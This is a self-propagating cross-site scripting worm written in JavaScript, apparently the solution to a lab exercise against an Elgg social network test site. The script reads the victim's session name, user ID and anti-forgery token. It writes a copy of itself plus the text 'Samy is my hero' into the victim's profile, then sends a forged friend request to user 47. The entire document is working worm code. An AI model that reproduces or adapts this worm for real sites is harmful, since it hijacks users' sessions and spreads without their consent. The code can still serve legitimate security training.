<script id=worm>
window.onload = function(){
var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
var jsCode = document.getElementById("worm").innerHTML;
var tailTag = "</" + "script>";
var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);


  //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
  //and Security Token __elgg_token
var userName=elgg.session.user.name;
var guid="&guid="+elgg.session.user.guid;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;
var desc = "&description=Samy+is+my+hero"+wormCode+"&accesslevel%5Bdescription%5d=2";


var sendurlGET = "http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token;

var sendurlPOST = "http://www.xsslabelgg.com/action/profile/edit";
var content=userName + guid+ ts +token + desc;

var samyGuid=47;    //FILL IN
if(elgg.session.user.guid!=samyGuid)  {
   //Create and send Ajax request to modify profile
   	var Ajax=null;
 	Ajax=new XMLHttpRequest();
  	Ajax.open("POST",sendurlPOST,true);
	Ajax.setRequestHeader("Host","www.xsslabelgg.com");
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
     	Ajax.send(content);

//Create and send Ajax request to add friend
Ajax=new XMLHttpRequest();
Ajax.open("GET",sendurlGET,true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.send();
  }
}
</script>

